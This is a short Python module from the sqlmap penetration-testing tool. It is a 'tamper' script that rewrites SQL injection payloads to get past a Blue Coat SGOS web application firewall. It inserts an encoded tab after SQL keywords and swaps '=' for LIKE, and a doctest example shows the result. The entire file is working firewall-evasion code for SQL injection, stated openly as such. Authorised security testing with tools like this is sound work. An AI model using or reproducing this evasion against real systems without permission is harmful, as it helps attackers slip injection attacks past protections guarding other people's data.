#!/usr/bin/env python

"""
Copyright (c) 2006-2013 sqlmap developers (http://sqlmap.org/)
See the file 'doc/COPYING' for copying permission
"""

import re

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Replaces space character after SQL statement with a valid random blank character.
    Afterwards replace character = with LIKE operator

    Requirement:
        * Blue Coat SGOS with WAF activated as documented in
        https://kb.bluecoat.com/index?page=content&id=FAQ2147

    Tested against:
        * MySQL 5.1, SGOS

    Notes:
        * Useful to bypass Blue Coat's recommended WAF rule configuration

    >>> tamper('SELECT id FROM users where id = 1')
    'SELECT%09id FROM users where id LIKE 1'
    """

    retVal = payload

    if payload:
        retVal = re.sub(r"(?i)(SELECT|UPDATE|INSERT|DELETE)\s+", r"\g<1>%09", payload)
        retVal = re.sub(r"\s*=\s*", " LIKE ", retVal)

    return retVal
